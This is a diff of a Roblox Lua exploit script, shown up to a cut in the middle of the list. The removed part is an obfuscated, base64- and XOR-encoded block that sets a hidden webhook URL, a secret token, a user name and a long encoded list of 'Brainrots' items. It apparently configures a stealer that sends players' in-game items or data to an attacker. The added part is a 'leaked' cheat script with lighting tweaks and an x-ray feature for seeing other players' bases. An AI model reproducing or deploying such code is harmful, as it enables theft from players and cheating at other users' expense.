@@ -1,415 +1,2017 @@
---[[ Protected with multi-layer encoding ]]
-local _lI0lI0l0=tostring(4142);local _OlIll0lO0l=tostring(6450);local _0l0I0lI0lI=tostring(1950);local _O0O0O00="_0lI00";local _l0llOOOO="_O0llO";local _I0O00I0Il0=54835;local _0IIl0ll=88879;
-local _OllI0OI0="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
-local function _0OlI0lO0(_00lOO0)
-  local _0O000O=""
-  _00lOO0=string.gsub(_00lOO0,"[^".._OllI0OI0.."=]","")
-  for _l0I0=1,#_00lOO0,4 do
-    local a=string.find(_OllI0OI0,string.sub(_00lOO0,_l0I0,_l0I0),1,true)-1
-    local b=string.find(_OllI0OI0,string.sub(_00lOO0,_l0I0+1,_l0I0+1),1,true)-1
-    local c=string.find(_OllI0OI0,string.sub(_00lOO0,_l0I0+2,_l0I0+2),1,true)
-    local d=string.find(_OllI0OI0,string.sub(_00lOO0,_l0I0+3,_l0I0+3),1,true)
-    if c then c=c-1 end
-    if d then d=d-1 end
-    _0O000O=_0O000O..string.char((a*4+math.floor((b or 0)/16))%256)
-    if c then _0O000O=_0O000O..string.char(((b or 0)%16*16+math.floor((c or 0)/4))%256) end
-    if d then _0O000O=_0O000O..string.char(((c or 0)%4*64+(d or 0))%256) end
-  end
-  return _0O000O
+--[[
+    Made by PILI
+    Leaked by https://discord.gg/WfTDsBPR9n join for more sources
+--]]
+
+---------------
+-- SERVICES --
+---------------
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local Lighting = game:GetService("Lighting")
+local Stats = game:GetService("Stats")
+local ContextActionService = game:GetService("ContextActionService")
+
+local lp = Players.LocalPlayer
+local player = lp
+
+----------------------------
+-- COLORS (script 2 palette + slight purple) --
+----------------------------
+local BG_DARK = Color3.fromRGB(11, 11, 11)
+local BTN_DARK = Color3.fromRGB(20, 20, 20)
+local BTN_HOVER = Color3.fromRGB(28, 28, 28)
+local BTN_ON = Color3.fromRGB(100, 30, 200)
+local PURPLE = Color3.fromRGB(157, 78, 221)
+local PURPLE2 = Color3.fromRGB(123, 44, 177)
+local TEXT_ON = Color3.fromRGB(255, 255, 255)
+local TEXT_OFF = Color3.fromRGB(180, 180, 180)
+local STROKE_OFF = Color3.fromRGB(42, 42, 42)
+local STROKE_ON = Color3.fromRGB(180, 100, 255)
+
+local function tw(obj, t, props, style)
+    style = style or Enum.EasingStyle.Quad
+    TweenService:Create(obj, TweenInfo.new(t, style, Enum.EasingDirection.Out), props):Play()
 end
-local _OllOI00l={236,32,63,78,142,243,19,222}
-local function _OOl0IO00(_00lOO0)
-  local _0O000O=""
-  for _l0I0=1,#_00lOO0 do
-    local k=_OllOI00l[(_l0I0-1)%#_OllOI00l+1]
-    local b=string.byte(_00lOO0,_l0I0)
-    local r=0
-    for bit=0,7 do
-      local ba=math.floor(b/2^bit)%2
-      local bb=math.floor(k/2^bit)%2
-      if ba~=bb then r=r+2^bit end
+
+----------------
+-- OPTIMIZER --
+----------------
+local optimizerEnabled = false
+local savedLighting = {}
+local optimized = {}
+
+local function enableOptimizer()
+    if optimizerEnabled then return end
+    optimizerEnabled = true
+    savedLighting = {
+        GlobalShadows = Lighting.GlobalShadows,
+        FogStart = Lighting.FogStart,
+        FogEnd = Lighting.FogEnd,
+        Brightness = Lighting.Brightness,
+        EnvironmentDiffuseScale = Lighting.EnvironmentDiffuseScale,
+        EnvironmentSpecularScale = Lighting.EnvironmentSpecularScale,
+    }
+    Lighting.GlobalShadows = false
+    Lighting.FogStart = 0
+    Lighting.FogEnd = 1e9
+    Lighting.Brightness = 1
+    Lighting.EnvironmentDiffuseScale = 0
+    Lighting.EnvironmentSpecularScale = 0
+
+    for _, v in ipairs(workspace:GetDescendants()) do
+        if v:IsA("BasePart") then
+            optimized[v] = {v.Material, v.Reflectance}
+            v.Material = Enum.Material.Plastic
+            v.Reflectance = 0
+        elseif v:IsA("Decal") or v:IsA("Texture") then
+            optimized[v] = v.Transparency
+            v.Transparency = 1
+        elseif v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Smoke") or v:IsA("Fire") then
+            optimized[v] = v.Enabled
+            v.Enabled = false
+        end
     end
-    _0O000O=_0O000O..string.char(r)
-  end
-  return _0O000O
 end
-local function _0llOOIOll0l0(_00lOO0) return _OOl0IO00(_0OlI0lO0(_00lOO0)) end
-local _lO0OOlOlI0=44851;local _IOIOIIO0="_lllO0";
-local function _Il0I0IO0Ol()
-getgenv().User = _0llOOIOll0l0("iEl".."NOveDc".."qecQQ".."==")
 
-getgenv().Webhook = _0llOOIOll0l0("hFRL".."Pv3J".."PPGISUwt".."4YF38I".."9PUmHvg3".."rxm0VdJ".."uGceK3D".."EQt2vMIk".."5t8".."VCXm/xyv".."u3xIIfa".."HCTLDYa".."XwtwLpp".."qphuZjy".."3mH".."6Qg0Rcf".."9vGJ".."q2W".."RHd7".."4oVYm".."tlQC".."xv2u2W".."6mHNn".."AOGZVq".."S0Wg0g6".."cEj".."6qRhCC".."nPy1qdrQ".."==")
+local function disableOptimizer()
+    if not optimizerEnabled then return end
+    optimizerEnabled = false
+    for k, v in pairs(savedLighting) do
+        Lighting[k] = v
+    end
+    for obj, val in pairs(optimized) do
+        if obj and obj.Parent then
+            if typeof(val) == "table" then
+                obj.Material = val[1]
+                obj.Reflectance = val[2]
+            elseif typeof(val) == "boolean" then
+                obj.Enabled = val
+            else
+                obj.Transparency = val
+            end
+        end
+    end
+    optimized = {}
+end
 
-getgenv().SecretToken = _0llOOIOll0l0("jhkN".."KL/Cc".."u3BEA".."p9uN4n6".."okYEizs".."wyDz3BcL".."Kur".."Hce".."neGFt8")
+---------------
+-- XRAY BASE --
+---------------
+local baseOrigTransp = {}
+local plotConns = {}
+local xrayConn
 
-getgenv().Brainrots = {
-  _0llOOIOll0l0("v1RNL/mR".."dqyeWR".."8L4pZ".."jto1OSw=".."="),
-  _0llOOIOll0l0("oUVQOeI="),
-  _0llOOIOll0l0("pEV".."eKu".."KWYK".."3MaF".."A8/".."ZZ+v4".."I="),
-  _0llOOIOll0l0("v0tWLOeX".."ev64T".."1Yi64c="),
-  _0llOOIOll0l0("pFlbP".."O/TV6y".."NR1Ag".."rrBys".."IJF".."UyLhnXo".."="),
-  _0llOOIOll0l0("qFJe".."KeG".."dM5".."mFT".."lgr/Jp9t".."w=="),
-  _0llOOIOll0l0("qFJeKeGd".."M52NTlE".."r4p".."98sIU="),
-  _0llOOIOll0l0("oE9".."JK66/f".."KiJAH0r7".."4E="),
-  _0llOOIOll0l0("oEEfH".."fuD".."YbuBR".."R8N".."4Z5xt".."4JB".."TCfhnQ=".."="),
-  _0llOOIOll0l0("r0V".."TK/2H".."er+A".."AG8r6ZJ".."gq58="),
-  _0llOOIOll0l0("vE9P".."LfuBZv6".."NTltuyJp".."ppJlSS".."g=="),
-  _0llOOIOll0l0("vk9".."MK/fTcr".."CIA".."Gsr6p".."dq"),
-  _0llOOIOll0l0("r0FP".."J/qSfb".."HMb".."VAs9w=="),
-  _0llOOIOll0l0("r09QJef".."TcrCI".."AHIn4ph".."6"),
-  _0llOOIOll0l0("rlVNKfuB".."fP6tTlt".."uyIFqq55".."P"),
-  _0llOOIOll0l0("p0VLO".."/6SZ/6".."uUl".."A9"),
-  _0llOOIOll0l0("vkVWIOeH".."fP6/T".."Fon6Zt".."6qoM="),
-  _0llOOIOll0l0("oE9M".."bs+e".."erm".."DUw=="),
-  _0llOOIOll0l0("oEE".."fHe".."uQYbuY".."AHwh45".."F6sI1T".."ViH".."g"),
-  _0llOOIOll0l0("oE9Mb".."t2WeLG".."AQVc9"),
-  _0llOOIOll0l0("v0lYIO".."GBdv6vQU".."0v/".."pJwu".."w=="),
-  _0llOOIOll0l0("qlJe".."Kfy".."Sfr/M".."QVE".."qrrB7sY".."9SXi".."Pv"),
-  _0llOOIOll0l0("oEEfD".."e+Acv6uT".."1A="),
-  _0llOOIOll0l0("oEEfCOG".."cd/6".."vT1Is551".."yrY".."VPUQ".."=="),
-  _0llOOIOll0l0("qUx".."aKO+d".."Z7HMZk0n".."6Zw="),
-  _0llOOIOll0l0("v1BQIeW".."KM7+CRB8".."e+55".."jtZU="),
-  _0llOOIOll0l0("oEEfC".."eeddLueA".."Gwr5Z".."x/v4Q".."="),
-  _0llOOIOll0l0("q0lR".."KeuBM".."5mJUl46"),
-  _0llOOIOll0l0("v0F".."SI/ede".."v6qQUs6".."5516"),
-  _0llOOIOll0l0("oE9Mbt".."2Dc".."rmERUs6".."54A="),
-  _0llOOIOll0l0("qkVMOueF".."dv7aF".."w=="),
-  _0llOOIOll0l0("ukVROuG".."ferueT".."x8e74V8s".."IlSUA".."=="),
-  _0llOOIOll0l0("v1BeKe".."aWZ6qFAG".."s7759".."2qp".."hJ"),
-  _0llOOIOll0l0("rU5LIe".."CafA=="),
-  _0llOOIOll0l0("q0FNL+O".."SM7+CRB".."8D75d".."msIh".."VUS".."k="),
-  _0llOOIOll0l0("vk9MK/qH".."ev64VV".."4i64".."dnt".."w=="),
-  _0llOOIOll0l0("okFcJuHT".."QK6VR".."Fo8"),
-  _0llOOIOll0l0("qklMJue".."dfP".."6vTF".."A54Jp9sQ".."=="),
-  _0llOOIOll0l0("oEFJ".."L+qcYbe".."YTx".."8d/pp".."9t5hP"),
-  _0llOOIOll0l0("pk9".."TIvfTWbG".."ATEZu3ZJ".."7q5".."4="),
-  _0llOOIOll0l0("uElN".."J+KaeL+A".."SVQvr".."qd6rIVM".."ViXvn".."3K1g".."w=="),
-  _0llOOIOll0l0("p0V".."LLeaGYav".."MQVEqrr".."5mrZhV".."TTs="),
-  _0llOOIOll0l0("v1deKemK".."M5yeT0w="),
-  _0llOOIOll0l0("oEEfH".."OGecrCYS".."VxuyYF".."ysI".."hF"),
-  _0llOOIOll0l0("o1Jc".."L+KWd7GC"),
-  _0llOOIOll0l0("uEl".."cOu+QM42".."NSEo8"),
-  _0llOOIOll0l0("p0VLO/".."6SZ/".."6nRU8v+".."g=="),
-  _0llOOIOll0l0("oEEf".."Gu+QfP".."6vT1Is".."551yr".."YVPUQ".."=="),
-  _0llOOIOll0l0("uEFRKa6n".."crCLAHQr".."4pZnv".."4JH"),
-  _0llOOIOll0l0("oE9JJ+DT".."QbGfR".."Q=="),
-  _0llOOIOll0l0("oE9MbtqS".."cLGeSUs".."v/Q=="),
-  _0llOOIOll0l0("qVZWIuu".."XfL".."A="),
-  _0llOOIOll0l0("oE9M".."bt6BerO".."DUw=".."="),
-  _0llOOIOll0l0("oEEfBO".."Gff6f".."MZ00v4Jd".."2"),
-  _0llOOIOll0l0("uwBQ".."PK6/"),
-  _0llOOIOll0l0("qVNQJa".."6gdrWDTF".."4m"),
-  _0llOOIOll0l0("oE9Mbt6".."GdLmF".."RUw".."="),
-  _0llOOIOll0l0("uFJe".."Iu+fdrq".."DTg=="),
-  _0llOOIOll0l0("q09".."dLOKaf".."bHMd".."VEn7Zpws".."oVOU".."A=="),
-  _0llOOIOll0l0("uFVZK".."K6nfKuPQ".."VE="),
-  _0llOOIOll0l0("oUlaO".."uuHdre".."eQR".."8M55".."B6vYB".."FSyv".."ngXI="),
-  _0llOOIOll0l0("oU9RK".."/fTXrGCR".."UZu3JZ6s".."IhFW".."jw="),
-  _0llOOIOll0l0("r0h".."WIu".."Kaff6v".."SFY".."i5w=="),
-  _0llOOIOll0l0("r0h".."WPv2cM7".."+CRB".."8f+".."5ZgsQ=="),
-  _0llOOIOll0l0("oEE".."fHf6cfLW".."VAHg87".."513u".."w=="),
-  _0llOOIOll0l0("rkFcO/yG".."M7+CRB8".."L6ZRmrJk".."="),
-  _0llOOIOll0l0("oE9Mbs".."yBfK".."0="),
-  _0llOOIOll0l0("oEE".."fC/aH".."erCPV".."B8J".."/JJ9uok".."="),
-  _0llOOIOll0l0("oE9Mbs".."2SfbqFR".."Uw="),
-  _0llOOIOll0l0("r0V".."TO+K".."SYb2F".."TlZu2".."Jpwt4N".."TViD".."n"),
-  _0llOOIOll0l0("oE9Mbr".."jE"),
-  _0llOOIOll0l0("oE9MbsO".."ccbeA".."SUw="),
-  _0llOOIOll0l0("oU9RK/".."fTXrGCR".."UZu3oZ0u".."ZU="),
-  _0llOOIOll0l0("oE9".."MbsSc".."f7K".."VAHwh".."45F6sI1T".."ViH".."gkmA="),
-  _0llOOIOll0l0("oE9Mbt".."2DfLGH".."WR8N".."4Z5xt".."4JBTC".."fhnX".."Kt"),
-  _0llOOIOll0l0("oE9Mbsa".."cZ62".."cT0s954d".."8rQ=="),
-  _0llOOIOll0l0("oE9".."Mbt6f".."crCFVF".."A9"),
-  _0llOOIOll0l0("r0h".."WLe".."KWZ7uFU".."l5uzYZj".."t4hFV".."jzv"),
-  _0llOOIOll0l0("qGofHu+".."dd78="),
-  _0llOOIOll0l0("oEFMbt2a".."YA=="),
-  _0llOOIOll0l0("v1BWIOC".."KM5aNTVI".."3"),
-  _0llOOIOll0l0("oE9Mb".."t2Edr".."uYS".."Fov/Id".."g"),
-  _0llOOIOll0l0("uEF".."cIfya".."Z7/M".."YlYt55".."B/u5hB"),
-  _0llOOIOll0l0("olVcIuuS".."YbHMZFY".."g4Y".."Bgv5l".."SUA".."=="),
-  _0llOOIOll0l0("oE9".."Mbs2c".."fryFTl4".."955x".."9v58".."="),
-  _0llOOIOll0l0("r0hWLeKW".."Z7uFUl".."5uwJx2s".."phFVjzv"),
-  _0llOOIOll0l0("r0h".."WI+Ca".."fbE="),
-  _0llOOIOll0l0("v1d".."eKa6gf".."LqN"),
-  _0llOOIOll0l0("ok9QbuOK".."M5aJQU0".."6"),
-  _0llOOIOll0l0("oUFNJ++Q".."e7fMY1".."A87".."4l8".."sIU="),
-  _0llOOIOll0l0("uEFc".."Ifyaf".."7KDAH".."w84ZB8uo".."VMUy".."E="),
-  _0llOOIOll0l0("oE9M".."brz".."G"),
-  _0llOOIOll0l0("oEEfCf".."ySf".."bqJA".."Hwh45F6s".."I1TV".."iHg"),
-  _0llOOIOll0l0("oE9Mbsy".."GYayF".."VFA9"),
-  _0llOOIOll0l0("qE9RJeuK".."Z6u".."eQlBu".."y4tj".."rIlTTA=="),
-  _0llOOIOll0l0("2hc".."="),
-  _0llOOIOll0l0("oE9M".."bs2ber2A".."RUsr5".."4FyrQ=="),
-  _0llOOIOll0l0("q1VaPfr".."TJej".."a"),
-  _0llOOIOll0l0("oE9".."MbsOa".."M5mNVFY".."64YA="),
-  _0llOOIOll0l0("vkFRKa6h".."erCLAH07".."/Q=="),
-  _0llOOIOll0l0("ok9Qbu".."OKM46".."eRUwr4Ic".."="),
-  _0llOOIOll0l0("oE9".."MbsCcfL".."HMbU".."Zux".."pxnr".."ZxPSz3nh".."3yt"),
-  _0llOOIOll0l0("ok9QbuO".."KM5".."2NTls".."3"),
-  _0llOOIOll0l0("rVJcL".."+qcY6".."uf"),
-  _0llOOIOll0l0("oE9Mbt+".."Gdq2N".."RFYi4pJ".."g"),
-  _0llOOIOll0l0("r0hWLe".."KWZ7uF".."UlYg79".."NRt".."49JXCLr".."h3a3nklR".."Lw=="),
-  _0llOOIOll0l0("rlVNPOeH".."fP6uQVEq".."54d8"),
-  _0llOOIOll0l0("r0hWIuL".."TQ6ucUEY".."="),
-  _0llOOIOll0l0("vVVaP".."e+Xer".."KAT".."x8Y755j".."t55P"),
-  _0llOOIOll0l0("r0hWL".."eKWZ7uF".."Ul5uzJ".."pwt49".."MWjr".."rmmG/"),
-  _0llOOIOll0l0("rlJKIO".."eHfP6hQ".."U0954".."d8"),
-  _0llOOIOll0l0("r1VP".."J+rTW7".."GYU0".."8h+g=="),
-  _0llOOIOll0l0("oUkfCe".."+HeqqD"),
-  _0llOOIOll0l0("pE8fBuHT".."W7HMc14".."m+4E="),
-  _0llOOIOll0l0("r1V".."PJ+r".."TUKuc".."SVtu3".."ZJ7".."q54="),
-  _0llOOIOll0l0("rlV".."RJ/".."qcM5".."yZTlY64d".."NAroV".."OVj".."rh"),
-  _0llOOIOll0l0("vVVaP".."e+X".."erK".."AQR8N/Jx".."wsYhJU".."y8="),
-  _0llOOIOll0l0("vE9Lbt6G".."fq6".."HSVE="),
-  _0llOOIOll0l0("okF".."KKeaHav6".."iQUop".."5odq"),
-  _0llOOIOll0l0("pE9NK+".."maf".."bfMYlAh".."4w=="),
-  _0llOOIOll0l0("v0FRO".."u/TW7GY".."U08h+g".."=="),
-  _0llOOIOll0l0("vElNO+K".."aZ7GF".."VF5u".."zJpwt49".."MWjrrm".."mG/"),
-  _0llOOIOll0l0("3hU".."="),
-  _0llOOIOll0l0("vE9Lbsa".."cZ62cT0s".."="),
-  _0llOOIOll0l0("uE8fOuHT".."Z7HMc14m".."+4E="),
-  _0llOOIOll0l0("uEVTK+Oc".."YaqJ"),
-  _0llOOIOll0l0("oEEfHe+".."bZqzMY".."1Aj7Jp".."9v59J".."UCA="),
-  _0llOOIOll0l0("oElMOq".."6/eq2Y".."AHMn/Y".."czjY1I".."Sjw="),
-  _0llOOIOll0l0("ok9".."QbuOKM7".."uUQVIn".."4JY="),
-  _0llOOIOll0l0("ok9QIa6+".."av6".."kT0s".."9/pxn"),
-  _0llOOIOll0l0("uFVR".."Ka6nZrC".."LAGs7".."4JQz".."jY1IS".."jw="),
-  _0llOOIOll0l0("rlVRIP".."eecrA="),
-  _0llOOIOll0l0("oE9MbsSc".."cb2FVFA9"),
-  _0llOOIOll0l0("r1VeKv".."ySfr".."+YAF".."4g6".."tNDv".."4dSXib".."jkm".."ezjU1e".."Og=="),
-  _0llOOIOll0l0("vEx".."aL/2WM".."7OVAG".."8864B2s".."Jg="),
-  _0llOOIOll0l0("oE9".."Mbs2".."GcL+".."eQVwm74".."A="),
-  _0llOOIOll0l0("3VgONr".."+LIg=="),
-  _0llOOIOll0l0("oE9JK66/".."fKiJAH".."Mh+J".."YzjY".."1ISjw".."="),
-  _0llOOIOll0l0("vEV".."NPOeHfP".."6uVU08".."54d8"),
-  _0llOOIOll0l0("q1JeJ/".."6GYK3MbV".."oq+4Bgtw".."=="),
-  _0llOOIOll0l0("q0lZO".."uedev6/".."UEYq6".."4F6s".."IU="),
-  _0llOOIOll0l0("q29+Gg".."=="),
-  _0llOOIOll0l0("uFJWLe".."Wcf".."7eCTw=="),
-  _0llOOIOll0l0("uFJWPu".."KaZ".."7HMdE0v4".."pJ/u55J".."SyH9"),
-  _0llOOIOll0l0("oEEfGO+".."QcL/Ma".."l4t5Zwz".."koVO".."Syv8mn2x"),
-  _0llOOIOll0l0("qkl".."MJuyccqy".."I"),
-  _0llOOIOll0l0("v0FRO".."vqW".."fA=="),
-  _0llOOIOll0l0("oEFM".."btiSYq".."uFVF49r".."qByqplS".."USf6".."kmA="),
-  _0llOOIOll0l0("oE9M".."bsWSYbWJ".."UlY64Y".."A="),
-  _0llOOIOll0l0("p0FNJeuB".."M42N".."SEo8"),
-  _0llOOIOll0l0("qlJeIOWW".."faqYR".."VA="),
-  _0llOOIOll0l0("oE9Mb".."tqBerGf"),
-  _0llOOIOll0l0("pk9dbs".."Sccf6mT".."11u3Z".."J7q54="),
-  _0llOOIOll0l0("oEFMbt".."qBcrKNT".."Fo854d".."yrQ=="),
-  _0llOOIOll0l0("vFVSPuWa".."fbfMc".."0836pZ".."ht4JJ"),
-  _0llOOIOll0l0("vk9cLeH".."TV7e".."fQ1A="),
-  _0llOOIOll0l0("qVh".."LJ+".."CQZ/6hQ".."Us6".."65w="),
-  _0llOOIOll0l0("oEEfBe+".."BeLu".."eS1".."48r".."rB8".."s45JU".."S/9mny".."w"),
-  _0llOOIOll0l0("vkV".."WIOqWd".."qzMdE0v4".."pJ/vw=="),
-  _0llOOIOll0l0("oEEfGO+Q".."cL/".."McE0r/Z".."Yzjp".."5FTCvgh3".."Y="),
-  _0llOOIOll0l0("tUVMPa6e".."av6".."JWF4j55".."12"),
-  _0llOOIOll0l0("q1V".."aPPya".."YbHMZF".."Yp5".."4dysok="),
-  _0llOOIOll0l0("rk9eOue".."HfP6t".."VU0v+p".."pnsQ=".."="),
-  _0llOOIOll0l0("oE9Mb".."tqBcrK".."NTFo85".."4d8rQ=".."="),
-  _0llOOIOll0l0("ulVTO".."vuB".."erCDAG".."wl6592q".."oNOU".."A=="),
-  _0llOOIOll0l0("oE9M".."btqcYaq".."ZUw=="),
-  _0llOOIOll0l0("tk9SLO".."eWM4q".."eQVMv4p".."I="),
-  _0llOOIOll0l0("oEE".."fDfu".."QcqyNQ1".."cv"),
-  _0llOOIOll0l0("qlJeK".."eGfcv6g".."QR8".."C79Nfvw=".."="),
-  _0llOOIOll0l0("qVhLJ+CQ".."Z/64Ul4i".."759".."2rIM="),
-  _0llOOIOll0l0("oE9Mbt2".."DarqJUlY".."g54A="),
-  _0llOOIOll0l0("rUdePPy".."afbfMTF".."5u3".."pJ/t4JJ"),
-  _0llOOIOll0l0("r0heLe".."aWcLaF"),
-  _0llOOIOll0l0("rkxeLeWb".."fLKJ".."AHgh74".."c="),
-  _0llOOIOll0l0("qFVTb".."sqGf".."/6o".."VVM".."="),
-  _0llOOIOll0l0("uE9NPPq".."GdLe".."CTlZuyoF".."yuYN".."OWTz".."7h3qwh".."Q=="),
-  _0llOOIOll0l0("v0FSI/ed".."ev6/UEY".."q64".."F6s".."IU="),
-  _0llOOIOll0l0("pkFcJe".."GBerKA".."QQ=="),
-  _0llOOIOll0l0("uFJaIOGA".."Z6yZWkUh".."rqdmrI5".."PH3q+w".."yM="),
-  _0llOOIOll0l0("oE9Mb".."sOSZ6qJ".."T0w="),
-  _0llOOIOll0l0("p0FNJ".."euB".."eL+".."eAHQ".."7/Jhm".."rA=".."="),
-  _0llOOIOll0l0("rklMIe".."CHdv6".."rSUo+/".."ppnu55F"),
-  _0llOOIOll0l0("oEEf".."GO+Q".."cL/M".."c146+4".."F9scxzX".."jr7gX23".."mEE".."="),
-  _0llOOIOll0l0("p0FNJeu".."Be7uNUk".."tuwoZ".."ltZ".."lS"),
-  _0llOOIOll0l0("vE9Pbt6c".."Y/6/Q".."Vc7".."/A=="),
-  _0llOOIOll0l0("qE9".."TPua".."afbfMalo".."6/Zh6s".."IU="),
-  _0llOOIOll0l0("vEF".."RKu".."+de".."rCF".."AHk".."84YBnt4J".."J"),
-  _0llOOIOll0l0("q0lRK".."euB".."M52FU0s".."r/J1".."y"),
-  _0llOOIOll0l0("uEVRO".."u+Q".."fLKDAGsr".."7Z16vY".."M="),
-  _0llOOIOll0l0("r09cI".."e/TUq2fQ".."Uw95518"),
-  _0llOOIOll0l0("rkVTO".."+KSM5y".."JTEo".."p7w=="),
-  _0llOOIOll0l0("v0tKIu".."LTQLWZTF".."Nu3".."Zhms".."oA="),
-  _0llOOIOll0l0("p1JKP".."vuYM4".."6NR1Zu3".."pJ0t".."w=="),
-  _0llOOIOll0l0("r0FPP".."vuQcL".."eCTx8N4p".."xks".."IVOUA=="),
-  _0llOOIOll0l0("rlJePee".."ferCFA".."H0r/Jp+v".."IVOVg=".."="),
-  _0llOOIOll0l0("oFVJbs".."KGZ".."f6gV".."Uk="),
-  _0llOOIOll0l0("rU5".."PL+".."KaM5yNQl".."oi"),
-  _0llOOIOll0l0("ok9".."QbsKS".."M46DTFY0".."55I="),
-  _0llOOIOll0l0("r0hNJ/2e".."cq2B".."QVIv+".."g=="),
-  _0llOOIOll0l0("oE9Mb".."smSZ".."6qFVFA".."9"),
-  _0llOOIOll0l0("rkFS".."LPvTUb".."+BQkpu3".."ZJ7q54="),
-  _0llOOIOll0l0("oUFMOu".."GXfL".."CYSVwhrq".."d2sol".."QVivqn".."H27"),
-  _0llOOIOll0l0("vElcL".."eecf".."buYVF".."5uw".."5JwvY".."RJUS".."8="),
-  _0llOOIOll0l0("rk9dL66".."jcr".."CIQQ=="),
-  _0llOOIOll0l0("rlV".."XIa6X".."dv6iT1".."oi4Q=="),
-  _0llOOIOll0l0("qlJWIa".."69erCGQ".."Q=="),
-  _0llOOIOll0l0("q1JeI".."O2beruAT".."FBu".."3YN6rIV".."UWiLi"),
-  _0llOOIOll0l0("oE9M".."btqaY7fM".."dF4".."t4Y".."A="),
-  _0llOOIOll0l0("uE9QOue".."dev6/S".."E0n44".."N6s".."IU="),
-  _0llOOIOll0l0("tUVLJ66w".."f7+ZUw=="),
-  _0llOOIOll0l0("q0lRKeuB".."M5mA".."T10h"),
-  _0llOOIOll0l0("qFVYbuqG".."dP6IVV".."g="),
-  _0llOOIOll0l0("oVVS".."I/fTUrOO".."QVM".."v7IY".."="),
-  _0llOOIOll0l0("uEFNO".."u+B".."ZrmNAHwn".."/Yd2rI".."JB"),
-  _0llOOIOll0l0("v1FKL+K".."Sfb+CQQ=".."="),
-  _0llOOIOll0l0("v05eJ".."+KW".."faSD"),
-  _0llOOIOll0l0("r09".."NIK6".."wfKyCAH".."wh/J0".."zjY1".."ISj".."w="),
-  _0llOOIOll0l0("rVFKL+CS".."Zqo="),
-  _0llOOIOll0l0("r0FcL".."/2aZ7H".."Mc1467".."596".."qoM="),
-  _0llOOIOll0l0("o1JcL+Ka".."Z7/".."Mb00t7".."59y"),
-  _0llOOIOll0l0("r1JeLOy".."cM5".."KFTVAg6".."4dn".."vw=="),
-  _0llOOIOll0l0("oE9MbsG".."BcL+A".."SUsh/Q".."=="),
-  _0llOOIOll0l0("uFJeL".."fqc".."YbHMZF".."Yg4".."YByq55P"),
-  _0llOOIOll0l0("rlJN".."buuAM".."4qJSB8e7".."4d6rpl".."N"),
-  _0llOOIOll0l0("vEl".."cLeecfb".."vMbV4t".."7Zt6".."sI0="),
-  _0llOOIOll0l0("vEFUPO+b".."fr+YTV".."46551".."y"),
-  _0llOOIOll0l0("rk9SL".."O+Bd7eC".."SR8a4Y".."Fnt4JJ".."Vg=="),
-  _0llOOIOll0l0("oE9M".."bsycfr".."yFTlY64".."YA="),
-  _0llOOIOll0l0("rkFTIuu".."BerCNAG8".."r/o".."N2rIFJ".."UTrnnXI".."="),
-  _0llOOIOll0l0("vEFU".."PO+bfr".."+YT".."V4j74c="),
-  _0llOOIOll0l0("oE9Mbtq".."GfbmYVVE".."p+oZ9uY9".."JSyH9"),
-  _0llOOIOll0l0("rlVT".."LOeHfP".."6uQ".."VEq5".."4d8/rh".."SXiX6".."nGG3mE".."8="),
-  _0llOOIOll0l0("rkFTIuuB".."erCDA".."HMh".."4px/sQ".."=="),
-  _0llOOIOll0l0("oEFMbs2S".."Y6uP".."SFYg".."74A="),
-  _0llOOIOll0l0("uFJWPv".."6aM4".."qeT08".."+59".."NHrI".."NQTy".."+up2G".."3nFB".."e"),
-  _0llOOIOll0l0("q0FLOu".."eHfP6".."4QVwh+pw".."="),
-  _0llOOIOll0l0("oE9".."Mbs2bera".."ZQVE".."n4Jpg"),
-  _0llOOIOll0l0("r0FPJ6".."6ncr2".."D"),
-  _0llOOIOll0l0("pkFcJeH".."TWb+PS".."x8E75B".."4"),
-  _0llOOIOll0l0("uFJaIOG".."AZ6yZ".."WkU".."hrqdmrI5".."PH32+wyM".."="),
-  _0llOOIOll0l0("uVJKLOed".."ev6qTF4".."j65".."10q".."4VOVg".."=="),
-  _0llOOIOll0l0("qVhL".."J+CQZ".."/6uQV".."Mi64".."F6sI0="),
-  _0llOOIOll0l0("ukFSPu".."eBcv6v".."QU8++5B6".."sI0="),
-  _0llOOIOll0l0("uFJeIu".."+fe".."qqNAGs8".."759yso0="),
-  _0llOOIOll0l0("o1J".."cL+KW".."YbHMb00t".."759y"),
-  _0llOOIOll0l0("uFVUL+C".."dfP6u".."QVEv4".."J18"),
-  _0llOOIOll0l0("rUxaPf".."2af".."A=="),
-  _0llOOIOll0l0("uU5cIu".."eHfP6/".."QVI".."n+pw="),
-  _0llOOIOll0l0("uElPJ66n".."fK6F".."AGsv7Zw="),
-  _0llOOIOll0l0("o0RWIK".."63er".."DMZF".."YgrrdmsA".."=="),
-  _0llOOIOll0l0("qVNPPO".."uAYLHMc1".."Yp4J".."xhvw".."=="),
-  _0llOOIOll0l0("oU9RK/f".."TXrGCRUZ".."uw5J".."9"),
-  _0llOOIOll0l0("uElYPOG".."fermeRR".."8I/".."IZnsYJO".."Vg=="),
-  _0llOOIOll0l0("oE9Mbs".."2BfL".."2DRFY".."i4p".."pnsZ8="),
-  _0llOOIOll0l0("uFJeI".."u+fdqy".."DAGs".."8759yso0".."="),
-  _0llOOIOll0l0("oUFLOu".."uc"),
-  _0llOOIOll0l0("r0hWJv".."uSfb".."eCSR".."8a75B8sI".."VOVg=".."="),
-  _0llOOIOll0l0("q0FLOu+H".."erCDAH".."E375".."16sIM="),
-  _0llOOIOll0l0("q0lN".."L+iSM52".."JTFo9+oF".."2"),
-  _0llOOIOll0l0("r09cIe".."iSfaq".."DAHoi6".."5Vy".."sJhP"),
-  _0llOOIOll0l0("qklFNPfT".."QLGIQ".."Q=="),
-  _0llOOIOll0l0("uFJaK".."66nY".."buJA".."Gs865Y".."zjY1ISjw".."="),
-  _0llOOIOll0l0("rkFRL+".."CaZ7HM".."Yl4g6p".."pnsQ".."=="),
-  _0llOOIOll0l0("pkFcJeHT".."QK6N".."Vlo".."g+pxgv".."w=="),
-  _0llOOIOll0l0("uE9WI".."uuHZ7HMZ".."lAt75".."Bwt4".."JP"),
-  _0llOOIOll0l0("r0VRO".."vyGc".."L2FA".."HE77".."Z9m".."vY9J"),
-  _0llOOIOll0l0("r0FNPOGH".."erCFAH08".."75p".."9t4JJ"),
-  _0llOOIOll0l0("r0FNIu".."Gc"),
-  _0llOOIOll0l0("r0FcJuG".."BYbe".."YTx8D659".."8sIVUU".."A=="),
